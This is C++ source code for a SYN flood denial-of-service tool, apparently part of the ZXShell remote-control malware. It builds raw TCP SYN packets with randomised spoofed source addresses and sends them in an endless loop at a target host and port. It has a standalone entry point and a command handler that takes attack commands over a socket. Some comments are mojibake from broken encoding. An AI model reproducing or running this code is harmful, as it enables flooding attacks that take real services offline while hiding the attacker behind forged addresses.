/*

  Author: LZX

  Create: 2007.06.08
  Update: 2007.06.09

*/


#include <winsock2.h> 
#include "ddos.h"
#include "getopt.h"

#if !defined _ZXSHELL

char *DNS(char *HostName)
{
	HOSTENT *hostent = NULL;
	IN_ADDR iaddr;
	hostent = gethostbyname(HostName);
	if (hostent == NULL)
	{
		return NULL;
	}
	iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
	return inet_ntoa(iaddr);
}

#endif

inline unsigned __int64 GetCycleCount() 
{ 
__asm _emit 0x0F 
__asm _emit 0x31
}


unsigned long MakeRand32(int i) 
{ 

   unsigned long j1,j2,s; 

   i = i << 15; 

   srand( (unsigned int)GetCycleCount() + i ); 

   j1 = rand(); 
   j2 = rand(); 

   j1 = j1 << 16; 

   s = j1+j2; 

   return s; 
} 

unsigned short MakeRand16(int i) 
{ 
    unsigned short s; 

    i = i << 15; 

    srand( (unsigned int)GetCycleCount() +i ); 
    s = rand(); 

    return s; 
} 


#if !defined _ZXSHELL

//����Ч��ͺ������Ȱ�IP�ײ���Ч����ֶ���Ϊ0(IP_HEADER.checksum=0)
//Ȼ���������IP�ײ��Ķ����Ʒ���ĺ͡�
USHORT checksum(USHORT *buffer, int size)
{
       unsigned long cksum=0;
       while (size >1) {
              cksum+=*buffer++;
              size-=sizeof(USHORT);
       }
       if (size) cksum += *(UCHAR*) buffer;
       cksum = (cksum >> 16) + (cksum&0xffff);
       cksum += (cksum >> 16);
       return (USHORT) (~cksum); 
}

unsigned long cksum1(unsigned long cksum, USHORT *buffer, int size)
{
       while (size >1) {
              cksum+=*buffer++;
              size-=sizeof(USHORT);
       }
       if (size) cksum += *(UCHAR*) buffer;

       return (cksum); 
}

USHORT cksum2(unsigned long cksum)
{

       cksum = (cksum >> 16) + (cksum&0xffff);
       cksum += (cksum >> 16);
       return (USHORT) (~cksum); 
}

//
// ����tcp udp����͵ĺ���
// 
void _Checksum(IPHeader *pIphdr)
{
	
	PSD psd;
	unsigned long	_sum = 0;
	IPHeader  *ih;
	TCPHeader *th;
	UDPHEADER *uh;
	u_int ip_len=0, pro_len=0, data_len=0;
	unsigned char *data_offset;

	// �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
	ih = pIphdr;
	ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
	if(ih->ipProtocol == PROTO_TCP)
	{
		// �ҵ�TCP��λ��
		th = (TCPHeader *) ((u_char*)ih + ip_len);
		pro_len = ((th->dataoffset>>4)*sizeof(unsigned long));
		th->checksum = 0;
	}
	else if(ih->ipProtocol == PROTO_UDP)
	{
		// �ҵ�UDP��λ��
		uh = (UDPHEADER *) ((u_char*)ih + ip_len);
		pro_len = sizeof(UDPHEADER);
		uh->uh_sum = 0;
	}
	// ���ݳ���
	data_len = ntohs(ih->ipLength) - (ip_len + pro_len);
	// ����ƫ��ָ��
	data_offset = (unsigned char *)ih + ip_len + pro_len;

	// αͷ
	// ����ԴIP��ַ��Ŀ��IP��ַ
	psd.saddr = ih->ipSource;
	psd.daddr = ih->ipDestination;

	// ����8λ0��

	psd.mbz = 0;

	// Э��
	psd.ptcl = ih->ipProtocol;

	// ����
	psd.udpl = htons(pro_len + data_len);

	// ���뵽��һ��16λ�߽�
	for(int i=0; i < data_len % 2; i++)
	{
		data_offset[data_len] = 0;
		data_len++;
	}
	ih->ipChecksum = 0;
	ih->ipChecksum = checksum((USHORT*)ih, ip_len);
	_sum = cksum1(0, (USHORT*)&psd, sizeof(PSD));
	_sum = cksum1(_sum, (USHORT*)((u_char*)ih + ip_len), pro_len);
	_sum = cksum1(_sum, (USHORT*)data_offset, data_len);
	_sum = cksum2(_sum);

	// �������У��ͣ��������䵽Э��ͷ
	if(ih->ipProtocol == PROTO_TCP)
		th->checksum = _sum;
	else if(ih->ipProtocol == PROTO_UDP)
		uh->uh_sum = _sum;
	else 
		return;
}

#endif

CDDOS::CDDOS()
{
	memset(this, 0, sizeof(CDDOS));
	ErrorString = "";
}

CDDOS::~CDDOS()
{
	if(mSocketInited)
	{
		if(m_socket)
			closesocket(m_socket);
		if(hThread)
			CloseHandle(hThread);

		WSACleanup();
	}
}


BOOL CDDOS::GetStatus(DDOS_INFORMATION *infor)
{
	if(infor)
		memcpy(infor, &ddosinfor, sizeof(DDOS_INFORMATION));

	return runFlag;//��������״̬
}


BOOL CDDOS::SetTarget(char *szIP, WORD wPort, int attackmode)
{
	DWORD tmp = inet_addr(szIP);
	if(tmp == INADDR_NONE)
	{
		if(!DNS(szIP))
		{
			ErrorString = "Invalid IP format or domain.";
			return FALSE;
		}else
		{
			ddosinfor.hosttype = 1;
			_snprintf(ddosinfor.szURL, sizeof(ddosinfor.szURL), "%s", szIP);//domain
			ddosinfor.m_dwIP = inet_addr(DNS(szIP));
		}
	}else
	{
		ddosinfor.hosttype = 0;// ip address format
		ddosinfor.m_dwIP = tmp;
	}

	ddosinfor.m_Port = wPort;

    addr_in.sin_family=AF_INET; 
    addr_in.sin_port=htons(ddosinfor.m_Port); 
    addr_in.sin_addr.S_un.S_addr=ddosinfor.m_dwIP; 

	switch(attackmode)
	{
	case SYNFLOOD:
	case OPENANDCLOSE:
	//case SYNACKOPEN:
		ddosinfor.AttackMode = attackmode;
		break;
	default:
		ddosinfor.AttackMode = SYNFLOOD;
	}

	RefillSYNPacket();

	m_inited = TRUE;

	return 1;
}

BOOL CDDOS::FreshDNS()
{
	char *ip = DNS(ddosinfor.szURL);
	if(ip == NULL)
		return FALSE;

	ddosinfor.m_dwIP = inet_addr(ip);

    addr_in.sin_addr.S_un.S_addr = ddosinfor.m_dwIP; 

	return TRUE;
}

BOOL CDDOS::InitRAWSocket()
{
	if(mSocketInited)
		return 1;

    WSADATA    WSAData; 
    BOOL    flag; 
    int        nTimeOver; 

    if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
    { 
        ErrorString = "WSAStartup Error."; 
        return 0; 
    } 

    //����socket 
    if ((m_socket=ZXSAPI::WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET) 
    { 
        ErrorString = "RAW Socket Setup Error."; 
        return 0; 
    } 

    flag=1; 
    //����socket���Զ���IP���ݰ�ͷ 
    if (setsockopt(m_socket,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
    { 
        ErrorString = "setsockopt IP_HDRINCL error."; 
        return 0; 
    } 

    //���ó�ʱ 
    nTimeOver=1200; 
    if (setsockopt(m_socket, SOL_SOCKET, SO_SNDTIMEO, (char*)&nTimeOver, sizeof(nTimeOver))==SOCKET_ERROR) 
    { 
		ErrorString = "setsockopt SO_SNDTIMEO error."; 
		return 0; 
    }

	mSocketInited = 1;

	return 1;
}

void CDDOS::RefillSYNPacket()
{
	IPHeader	*lpIPhdr = &SYNPacket.iphdr;
	TCPHeader	*lptcphdr = &SYNPacket.tcphdr;
	SEGMENT     *lpsegment = &SYNPacket.options;

	int i = ddosinfor.totalPacketSent;

	if(ddosinfor.AttackMode == SYNFLOOD)
	{

		//�������ԴIP��ַ���жϣ�ֻȡB���C��IP��ַ 
		srcip = htonl(MakeRand32(i)); 
		while(((srcip & 0xe0000000) == 0xe0000000) || (srcip < 0x80000000)) 
		{ 
			srcip = htonl(MakeRand32(i)); 
		}

	}else if(ddosinfor.AttackMode == OPENANDCLOSE)
	{
		srcip = htonl(ddosinfor.m_dwIP);
	}

	seqnum = MakeRand32(i); 
	srcport = MakeRand16(i); 

	ident = MakeRand16(i+7); 

    //fill the IP head
	lpIPhdr->iphVerLen = (4<<4 | sizeof(IPHeader)/sizeof(unsigned long)); 
	lpIPhdr->ipTOS = 0;
	lpIPhdr->ipLength = htons(sizeof(IPHeader)+sizeof(TCPHeader)+sizeof(SEGMENT)); 
	lpIPhdr->ipID = htonl(ident);
	lpIPhdr->ipFlags = 0x40;
	lpIPhdr->ipTTL = 128;
	lpIPhdr->ipProtocol = PROTO_TCP;
	lpIPhdr->ipChecksum = 0;
	lpIPhdr->ipSource = htonl(srcip);
	lpIPhdr->ipDestination = ddosinfor.m_dwIP;

    //fill the TCP head
	lptcphdr->destinationPort = htons(ddosinfor.m_Port);
	lptcphdr->sourcePort = htons(srcport);
	lptcphdr->sequenceNumber = htonl(seqnum);
	lptcphdr->acknowledgeNumber = 0;
	lptcphdr->dataoffset = ((sizeof(TCPHeader)+sizeof(SEGMENT))/4<<4|0); 
	lptcphdr->flags = 2;//SYN
	lptcphdr->windows = ~0;
	lptcphdr->checksum = 0;
	lptcphdr->urgentPointer = 0;

	//segment
	lpsegment->size = 0xb4050402;
	lpsegment->nop[0] = 1;
	lpsegment->nop[1] = 1;
	lpsegment->SACKPermitted = 0x0204;

	_Checksum(lpIPhdr);

}

DWORD WINAPI CDDOS::SendThread()
{
	int retval;
	DWORD errcode;
	DWORD currTime = GetTickCount();

	while(runFlag)
	{
		RefillSYNPacket();

		if(GetTickCount() - currTime > 30*60*1000)
		{
			currTime = GetTickCount();

			if(ddosinfor.hosttype == 1)//domain! do dns
				FreshDNS();
		}

		//�����Զ����
		retval = ZXSAPI::sendto(m_socket, (char*)&SYNPacket, sizeof(SYNPacket), 
            0, (struct sockaddr*)&(addr_in), sizeof(addr_in));

		if(retval == SOCKET_ERROR)
		{
			//handles error code
			errcode = WSAGetLastError();

			if(errcode == WSAEWOULDBLOCK || errcode == WSAENOBUFS)
			{
				Sleep(2000);
				continue;
			}

			if(errcode == WSAEINTR)
			{
				ErrorString = "A blocking operation was interrupted by a call to WSACancelBlockingCall.";
				break;
			}else
			{
				ErrorString = "socket error.";
				break;
			}

		}

		ddosinfor.totalPacketSent++;

		__printf("SYNFlood Total Packets: %I64d\r", ddosinfor.totalPacketSent);

		if(ddosinfor.totalPacketSent % 5 == 0)
			Sleep(1);
	}

	runFlag = 0;

	__printf("\r\nSYNFlood SendThread Now Exit.\r\n");
	return 0;
}

DWORD WINAPI CDDOS::_SendThread(LPVOID lParam)
{
	CDDOS *pDDOS = (CDDOS*)lParam;

	return pDDOS->SendThread();
}

BOOL CDDOS::Start()
{
	if(!mSocketInited || !m_inited)
	{
		ErrorString = "Not Initializtion.";
		return FALSE;
	}

	if(runFlag==1)
	{
		ErrorString = "Already Running.";
		return FALSE;
	}

	ddosinfor.totalPacketSent = 0;

	hThread = ZXSAPI::CreateThread(NULL, 
					0, 
					(LPTHREAD_START_ROUTINE)_SendThread, 
					(LPVOID)this, 
					0, 
					&dwThreadId);

	if(hThread == NULL)
	{
		ErrorString = "CreateThread Failed.";
		return FALSE;
	}

	runFlag = 1;

	WaitForSingleObject(hThread, 1500);

	return runFlag;
}

void CDDOS::WaitToQuit()
{
	WaitForSingleObject(hThread, 10000);
	CloseHandle(hThread);
	hThread = NULL;
}

BOOL CDDOS::Close()
{
	if(runFlag == 0)
	{
		ErrorString = "Not Running.";
		return FALSE;
	}

	closesocket(m_socket);
	CloseHandle(hThread);

	memset(this, 0, sizeof(CDDOS));
	ErrorString = "";

	return TRUE;
}

#if defined _ZXSHELL

//ȫ�ֱ���

CDDOS g_SYNFlood;

int SYNFlood(MainPara *args)
{
	SPAMFUNCTION 
		
	SOCKET Socket = args->Socket;

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();

	char *Usage = 
		"SYNFlood V1.0.\r\n"
		"Usage:\r\n"
		"    SYNFlood [-h] <HostIP> [-p] <Port> [-m] <0|1> [-q] [-v]\r\n"
		"-m 0    synflood. (default)\r\n"
		"-m 1    open and close\r\n"
		"-q      End SYNFlood\r\n"
		"-v      View Current Status.\r\n"
		"Example:\r\n"
		"    synflood -h www.xxx.com -p 80 -m 0\r\n"
		"    synflood -h 222.xx.xx.x -p 80 -m 1\r\n"
		;

	int mode = 0;
	char *HostIP = NULL;
	WORD wPort = 0;
/*
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{
			switch(argv[i][1])
			{
			case 'q':
			case 'Q':
				if(g_SYNFlood.Close())
				{
					g_SYNFlood.WaitToQuit();
					SendMessage(Socket, "SYNFlood Stopped Successfully.\r\n");
				}else
				{
					SendMessage(Socket, "SYNFlood: %s.\r\n", g_SYNFlood.GetLastError());
				}
				return 0;
			case 'v':
			case 'V':
				{
					DDOS_INFORMATION ddosinfor;
					int bRun = g_SYNFlood.GetStatus(&ddosinfor);
					if(bRun == 0)
					{
						SendMessage(Socket, "SYNFlood: Not Running.\r\n");
					}else
					{
						SendMessage(Socket, 
							"SYNFlood Current Status:\r\n"
							"URL: %s\r\n"
							"IP : %d.%d.%d.%d\r\n"
							"Port: %d\r\n"
							"mode: %d\r\n"
							"TotalPacketsSent: %I64d\r\n",
							ddosinfor.szURL,
							ddosinfor.m_dwIP<<24>>24,ddosinfor.m_dwIP<<16>>24,ddosinfor.m_dwIP<<8>>24,ddosinfor.m_dwIP>>24,
							ddosinfor.m_Port,
							ddosinfor.AttackMode,
							ddosinfor.totalPacketSent);
					}

				}
				return 0;

			}
		}
		else
		{
			if(i==1) 
				continue;
			if(argv[i-1][0] != '-' && argv[i-1][0] != '/')
				continue;

			switch(argv[i-1][1])
			{
			case 'h':
			case 'H':
				HostIP = argv[i];
				break;
			case 'p':
			case 'P':
				wPort = atoi(argv[i]);
				break;
			case 'm':
			case 'M':
				mode = atoi(argv[i]);
				break;

			default:
				return SendMessage(Socket, Usage);
			}
		}
	}
*/
	CGetOpt cmdopt(argc, argv, false);

	if(cmdopt.checkopt("q"))
	{
		if(g_SYNFlood.Close())
		{
			g_SYNFlood.WaitToQuit();
			SendMessage(Socket, "SYNFlood Stopped Successfully.\r\n");
		}else
		{
			SendMessage(Socket, "SYNFlood: %s.\r\n", g_SYNFlood.GetLastError());
		}
		return 0;
	}else if(cmdopt.checkopt("v"))
	{
		DDOS_INFORMATION ddosinfor;
		int bRun = g_SYNFlood.GetStatus(&ddosinfor);
		if(bRun == 0)
		{
			SendMessage(Socket, "SYNFlood: Not Running.\r\n");
		}else
		{
			SendMessage(Socket, 
				"SYNFlood Current Status:\r\n"
				"URL: %s\r\n"
				"IP : %d.%d.%d.%d\r\n"
				"Port: %d\r\n"
				"mode: %d\r\n"
				"TotalPacketsSent: %I64d\r\n",
				ddosinfor.szURL,
				ddosinfor.m_dwIP<<24>>24,ddosinfor.m_dwIP<<16>>24,ddosinfor.m_dwIP<<8>>24,ddosinfor.m_dwIP>>24,
				ddosinfor.m_Port,
				ddosinfor.AttackMode,
				ddosinfor.totalPacketSent);
		}
		return 0;
	}

	if(cmdopt.getstr("h"))
	{
		HostIP = cmdopt;
	}
	if(cmdopt.getstr("p"))
	{
		wPort = cmdopt.getint("p");
	}	
	if(cmdopt.getstr("m"))
	{
		mode = cmdopt.getint("p");
	}	

	if(HostIP == NULL || wPort == 0)
		return SendMessage(Socket, Usage);

	int ret;

	ret = g_SYNFlood.GetStatus(NULL);
	if(ret)
	{
		//already running
		SendMessage(Socket, "SYNFlood %s\r\n", "Already Running.");
		return 0;
	}

	ret = g_SYNFlood.SetTarget(HostIP, wPort, mode);
	if(!ret)
		goto exit;

	ret = g_SYNFlood.InitRAWSocket();
	if(!ret)
		goto exit;

	ret = g_SYNFlood.Start();
	if(!ret)
		goto exit;


	SendMessage(Socket, "SYNFlood Started Successfully.\r\n");

	return 1;

exit:
	SendMessage(Socket, "SYNFlood: %s\r\n", g_SYNFlood.GetLastError());
	return 0;
}


#else

//example

int main(int argc, char **argv)
{

	char *Usage = 
		"DDOS V1.0 By LZX.\r\n"
		"Usage:\r\n"
		"DDOS [-h] <HostIP> [-p] <Port> [-m] <0|1>\r\n";

	int mode = 0;
	char *HostIP = NULL;
	WORD wPort = 0;

	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-' || argv[i][0] == '/')
		{

		}
		else
		{
			if(i==1) 
				continue;
			if(argv[i-1][0] != '-' && argv[i-1][0] != '/')
				continue;

			switch(argv[i-1][1])
			{
			case 'h':
			case 'H':
				HostIP = argv[i];
				break;
			case 'p':
			case 'P':
				wPort = atoi(argv[i]);
				break;
			case 'm':
			case 'M':
				mode = atoi(argv[i]);
				break;
			default:
				return printf(Usage);
			}
		}
	}

	if(HostIP == NULL || wPort == 0)
		return printf(Usage);

	int ret;
	CDDOS ddos;

	ret = ddos.SetTarget(HostIP, wPort, mode);
	if(!ret)
		goto exit;

	ret = ddos.InitRAWSocket();
	if(!ret)
		goto exit;

	ret = ddos.Start();
	if(!ret)
		goto exit;

	ddos.WaitToQuit();

	printf("%s\r\n", ddos.GetLastError());

	ddos.Close();

	return 1;

exit:
	printf("%s\r\n", ddos.GetLastError());
	return 0;
}


#endif